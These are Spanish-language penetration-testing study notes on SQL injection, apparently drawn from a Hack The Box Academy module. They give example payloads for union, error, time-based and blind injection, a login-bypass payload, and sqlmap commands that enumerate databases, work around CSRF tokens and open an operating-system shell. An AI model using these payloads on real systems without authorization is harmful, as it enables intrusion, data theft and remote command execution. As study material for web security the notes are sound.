# SQL Injection

## SQL Injection Fundamentals
- Una inyección SQL es una vulnerabilidad de seguridad que permite a un atacante interferir con las consultas que una aplicación web realiza a su base de datos SQL.
- La inyección SQL se produce cuando se insertan datos no validados en una consulta SQL.
- La inyección SQL puede ser utilizada para leer, modificar y eliminar datos de una base de datos.
- La inyección SQL puede ser utilizada para ejecutar comandos en el sistema operativo.
- Hay diferentes tipos de inyecciones SQL, como la inyección SQL basada en errores, la inyección SQL basada en tiempo y la inyección SQL ciega.
![](https://academy.hackthebox.com/storage/modules/33/types_of_sqli.jpg)
    - union based SQL injection
        - ejemplo de payload: `1' UNION SELECT 1,2,3 --`
    - error based SQL injection
        - ejemplo de payload: `1' AND 1=CONVERT(int, (SELECT @@version)) --`
    - time based SQL injection
        - ejemplo de payload: `1' AND IF(1=1, SLEEP(5), 0) --`
    - blind SQL injection
        - ejemplo de payload: `1' AND SLEEP(5) --`

### Deteccion de SQL Injection
- Generalmente al poner un `'` en un campo de texto y si la aplicación devuelve un error de SQL, es probable que sea vulnerable a SQL Injection.
- También se puede poner un comentario `--` como intento de primer payload.
- Otra forma de detectar SQL Injection es mediante la inyección de comandos SQL en los campos de texto y observar si la aplicación devuelve resultados inesperados.
    - **"Error: near line 1: near "'": syntax error"** es un mensaje de error común que se obtiene cuando se inyecta un `'` en un campo de texto.
    - Ejemplo: `1' OR '1'='1`

### Login Bypass SQL Injection
- La inyección SQL se puede utilizar para eludir la autenticación de un sistema.
- Ejemplo de payload: `admin' OR '1'='1`
    - Si el usuario y la contraseña son correctos, la consulta SQL se verá así: `SELECT * FROM users WHERE username='admin' AND password='password'`
    - Esto genera una tautología que siempre es verdadera, entonces la va a tomar como verdadera y va a permitir el acceso.
![](https://academy.hackthebox.com/storage/modules/33/or_inject_diagram.png)

## SQLMAP
- SQLMAP es una herramienta de prueba de penetración de código abierto que automatiza el proceso de detección y explotación de vulnerabilidades de inyección SQL.

### Comandos generales
- `sqlmap -u URL --dbs` para listar las bases de datos.
- `sqlmap -r HTTP-REQUEST-FILE --dbs` para usar un archivo con la request.
- `sqlmap -r HTTP-REQUEST-FILE --dbs --batch` para usar un archivo con la request y no hacer preguntas.
- `sqlmap -r HTTP-REQUEST-FILE --dbs --batch --level=5 --risk=3` para usar un archivo con la request y no hacer preguntas, con nivel de riesgo y nivel de profundidad.
- `sqlmap -r HTTP-REQUEST-FILE --dbs --batch --level=5 --risk=3  --current-user --current-db --is-dba` para usar un archivo con la request y no hacer preguntas, con nivel de riesgo y nivel de profundidad, y obtener información del usuario actual, base de datos actual y si es DBA.

#### Anti-CSRF Token
- Si la aplicación web utiliza tokens CSRF, se puede usar el parámetro `--csrf-token` para especificar el token CSRF.
- Ejemplo: `sqlmap -u URL --csrf-token=CSRF-TOKEN --dbs`
- `sqlmap -u URL --randomize=rp --dbs` para randomizar el token CSRF.
- `sqlmap -u URL --eval="import time; time.sleep(10)" --csrf-token=CSRF-TOKEN --dbs` para evaluar un script de python y dormir el tiempo que se le pase como argumento.

#### OS shell
- `sqlmap -u URL --os-shell` para obtener una shell en el sistema operativo.